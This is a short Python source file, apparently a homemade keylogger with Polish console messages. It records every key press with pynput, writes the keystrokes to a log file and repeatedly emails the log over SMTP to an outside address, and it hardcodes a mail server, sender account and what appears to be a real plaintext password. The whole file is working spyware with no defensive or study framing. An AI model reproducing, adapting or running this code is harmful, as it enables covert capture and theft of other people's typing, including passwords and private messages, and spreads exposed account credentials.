#sender
from pynput.keyboard import Key, Listener
import smtplib, ssl
from datetime import datetime
from threading import Timer
from time import *
import os

keys = []

port = 465
smtp = "mail-serwer64733.lh.pl" 

sender = "pytania@greenstar.net.pl"
password="Ug1nzMMj($X\SQ{0zO@X`}WpP"
reciver="ksiazki@greenstar.net.pl"
subject= datetime.today()

context = ssl.create_default_context()


def on_press(key):
	keys.append(key)
	write_keys(keys)

def write_keys(keys):
	with open ('/home/weirdo/Desktop/stinger/log.txt','w')	as log:
		for key in keys:
			key = str(key).replace("'", "")
			log.write(key)
def send():
	with smtplib.SMTP_SSL(smtp, port, context=context) as server:
	 server.login("pytania@greenstar.net.pl",password)
	 server.sendmail(sender,reciver,message)


c=0
while c<=5:
	with Listener(on_press=on_press) as listener:
		print("wpisuj")
		r=Timer(10,listener.stop)
		r.start()
		listener.join()	
		print("nie wpisuj")
		r.cancel()
		print("wysyłka")
		path='/home/weirdo/Desktop/stinger/log.txt'
		f=open(path,'r')
		mess=f.read()
		message="""Subject: {}
		\n
		\n 

		{}

		""".format(subject,mess)
		a=7
		t=Timer(1,send)
		t.start()
		sleep(1)
		t.cancel()	
		print("wysłano")
		os.remove('/home/weirdo/Desktop/stinger/log.txt')
		sleep(1)
		open ('/home/weirdo/Desktop/stinger/log.txt','w')
		sleep(1)